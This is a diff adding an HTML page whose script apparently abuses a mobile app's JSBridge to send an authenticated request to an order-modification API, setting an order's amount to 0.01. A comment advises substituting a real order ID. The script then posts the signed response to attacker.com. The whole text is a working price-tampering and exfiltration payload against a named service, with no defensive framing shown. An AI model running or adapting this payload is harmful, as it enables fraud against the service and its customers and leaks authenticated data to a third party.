@@ -1,0 +1,21 @@
+<!-- api.html -->
+<script>
+  // 调用 JSBridge 发起带签名的 POST 请求
+  JSBridge.call('httpRequest', {
+    method: 'POST',
+    url: 'https://api.district.in/orders/modify',
+    data: JSON.stringify({
+      order_id: "ORDER_12345",  // 替换为真实订单 ID（可通过其他方式获取）
+      amount: 0.01
+    }),
+    authentication: {
+      is_authenticated: true,
+      header_key: "Authorization"
+    }
+  }, function(response) {
+    fetch('https://attacker.com/log', {
+      method: 'POST',
+      body: JSON.stringify({result: response})
+    });
+  });
+</script>
